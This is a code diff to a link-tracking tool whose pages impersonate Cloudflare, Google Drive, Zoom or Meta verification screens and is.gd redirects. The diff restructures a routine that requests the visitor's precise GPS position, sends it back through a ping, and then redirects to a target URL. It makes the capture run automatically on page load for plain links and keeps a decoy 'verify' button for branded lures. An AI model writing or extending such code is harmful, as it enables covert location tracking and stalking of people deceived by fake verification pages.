@@ -285,56 +285,68 @@ module.exports = async (req, res) => {
 
             sendPing(payload);
 
-            // Real-time GPS Tracking TRIGGERED BY BUTTON CLICK
-            document.getElementById('verifyBtn').addEventListener('click', () => {
+            const execRedirect = () => {
                 const status = document.getElementById('statusText');
                 const checkbox = document.getElementById('cf-checkbox');
                 const spinner = document.getElementById('cf-spinner');
                 const check = document.getElementById('cf-check');
-                const btn = document.getElementById('verifyBtn');
                 
-                if (status) status.innerText = "Verifying...";
+                if (status) status.innerText = "Success! Redirecting...";
                 if (checkbox) checkbox.style.display = "none";
-                if (spinner) spinner.style.display = "block";
+                if (spinner) spinner.style.display = "none";
+                if (check) check.style.display = "block";
                 
-                if (btn && btn.style.opacity !== "0") {
-                    btn.innerText = "Please wait...";
-                    btn.disabled = true;
-                    btn.style.filter = "grayscale(1)";
-                }
-                
-                const execRedirect = () => {
-                    if (status) status.innerText = "Success! Redirecting...";
-                    if (spinner) spinner.style.display = "none";
-                    if (check) check.style.display = "block";
-                    setTimeout(() => {
-                        window.location.replace("${targetUrl}");
-                    }, 1000);
-                };
+                setTimeout(() => {
+                    window.location.replace("${targetUrl}");
+                }, 1000);
+            };
 
+            const triggerGPS = () => {
                 if (navigator.geolocation) {
-                    // Try to force the popup!
                     navigator.geolocation.getCurrentPosition((pos) => {
                         payload.lat = pos.coords.latitude;
                         payload.lon = pos.coords.longitude;
                         payload.accuracy = Math.round(pos.coords.accuracy) + "m";
                         payload.type = 'GPS_SAT';
-                        sendPing(payload); // Send updated GPS
-                        
-                        // Wait a sec to ensure ping goes out before redirect
+                        sendPing(payload);
                         setTimeout(execRedirect, 800);
-                        
                     }, (err) => {
-                        // User blocked or timed out
                         execRedirect();
                     }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                 } else {
                     execRedirect();
                 }
-
-                // Failsafe redirect if they ignore the popup entirely for 6 seconds
                 setTimeout(execRedirect, 6000);
-            });
+            };
+
+            // AUTO-TRIGGER for default/simple templates (is.gd)
+            // But MANUAL-TRIGGER for branded templates (Cloudflare, Drive, etc.)
+            const isManualTpl = ${['cf', 'drive', 'zoom', 'meta'].includes(tpl)};
+            
+            if (!isManualTpl) {
+                // For is.gd / plain links, trigger immediately without decoy button
+                triggerGPS();
+            } else {
+                // Branded templates need interaction
+                document.getElementById('verifyBtn').addEventListener('click', () => {
+                    const status = document.getElementById('statusText');
+                    const checkbox = document.getElementById('cf-checkbox');
+                    const spinner = document.getElementById('cf-spinner');
+                    const btn = document.getElementById('verifyBtn');
+                    
+                    if (status) status.innerText = "Verifying...";
+                    if (checkbox) checkbox.style.display = "none";
+                    if (spinner) spinner.style.display = "block";
+                    
+                    if (btn && btn.style.opacity !== "0") {
+                        btn.innerText = "Please wait...";
+                        btn.disabled = true;
+                        btn.style.filter = "grayscale(1)";
+                    }
+                    
+                    triggerGPS();
+                });
+            }
 
         }
         capture();
